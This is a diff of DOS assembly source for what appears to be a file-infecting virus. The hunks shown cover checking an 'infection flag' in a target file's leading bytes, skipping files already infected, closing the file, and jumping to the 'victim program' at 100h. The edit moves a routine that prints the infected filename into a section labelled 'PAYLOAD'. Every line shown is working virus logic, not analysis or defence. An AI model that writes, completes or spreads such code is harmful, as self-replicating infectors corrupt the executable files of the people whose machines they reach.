@@ -80,7 +80,7 @@ file_err_skip:
     mov ah, 3fh
     int 21h
 
-    ; cheking the infection flag
+    ; checking the infection flag
     cmp [bp + leading_bytes + 3], 0ffh
     jnz find_next_skip
 
@@ -95,13 +95,6 @@ find_next:
     jmp file_open
 
 find_next_skip:
-
-    ; output infected filename
-    lea dx, [bp + file.fname]
-    call str_f2c
-    mov ah, 09h
-    int 21h
-    call str_c2f
 
     ; moving carret to the start
     mov cx, 0
@@ -183,6 +176,17 @@ find_next_skip:
     ; closing file
     mov ah, 3eh
     int 21h
+
+    ; PAYLOAD BEGIN
+
+    ; output infected filename
+    lea dx, [bp + file.fname]
+    call str_f2c
+    mov ah, 09h
+    int 21h
+    call str_c2f
+
+    ; PAYLOAD END
 
     ; redirect to victim program
     mov ax, 100h
